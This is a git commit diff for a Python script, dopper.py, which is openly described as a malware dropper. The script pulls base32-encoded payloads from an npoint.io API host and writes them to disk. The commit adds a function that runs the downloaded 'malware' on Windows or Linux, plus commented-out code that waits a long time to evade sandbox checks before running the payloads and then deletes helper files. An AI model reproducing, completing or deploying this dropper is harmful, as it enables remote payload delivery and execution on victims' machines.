1442e78085e38a5c0730308783407d80c5d6f8f2
Dor <108623675+D0rDa4aN919@users.noreply.github.com>
2023-08-09 09:40:47 +0300

    Update dopper.py

--- dopper.py
+++ dopper.py
@@ -4,15 +4,28 @@
 # Author: Dor Dahan
 # License: MIT (See details in the LICENSE file or at the end of this script)
 ##############################################################################
-import pip
 
+import pip, platform, os, time
+
+# Check the operating system
+OS= platform.system()
+WIN = False
+LINUX = False
+if OS == "Windows":
+    WIN = True
+elif OS == "Linux":
+    LIN = True
 # The API url fetch the json dropper
 URL = "https://api.npoint.io/531896996f8103fa82c3"
 # The pip packages to install
 packages = ["requests"]
 
 def install_package(package_name):
-    # Will install the packages requirements for the script to run.
+    """
+    Will install the packages requirements for the script to run.
+    :param package_name: The package name
+    :return:
+    """
     while True:
         try:
             pip.main(["install", package_name])
@@ -20,10 +33,37 @@ def install_package(package_name):
         except Exception:
             continue
 
+def execute_process(program, index):
+    """
+    Will check the OS and will act as need to the OS.
+    :param program: The malware name
+    :param index: The index number of the name
+    :return:
+    """
+    import subprocess
+    while True:
+        try:
+            if WIN:
+                if not program.endswith(".exe"):
+                    subprocess.run([program], check=True)
+                ## If you want to use other script that are not exe file
+                # else:
+                #     with open(f"execute{index}.bat", "w") as file:
+                #         file.write(f'@{programming_language} {program}')
+                #     subprocess.run(["execute.bat"], check=True, shell=True)
+                break
+            elif LIN:
+                subprocess.run(["chmod", "+x", program], check=True)
+                subprocess.run([program], check=True)
+                break
+        except subprocess.CalledProcessError:
+            continue
+
 def main():
     import base64, requests
     # Getting the response from the api server
     response = requests.get(url=URL).json()
+    names = []
     # Looping throw the keys in the json format
     for index, key in enumerate(response):
         # Create new file name via the index and file name
@@ -40,7 +80,19 @@ def main():
             decoded = malware.encode("utf-8")
             # Decoding the body to insert into the file
             decoded = base64.b32decode(decoded)
+            names.append(f"{filename[0]}_{index}.{extension}")
             file.write(decoded)
+    # ## If you enter this to dropper for execution after downloading
+    ## For create a time interval between the download and the execution (bypass sandbox check)
+    # time.sleep(10000)
+    ## will execute the script by the order of download
+    # for index, program in enumerate(names):
+    #     execute_process(program, index)
+    ## delete the bat file that are created
+    # for index in range(len(names)):
+    #     if os.path.isfile(f"execute{index}.bat"):
+    #         os.remove(f"execute{index}.bat")
+
 
 
 if __name__ == '__main__':
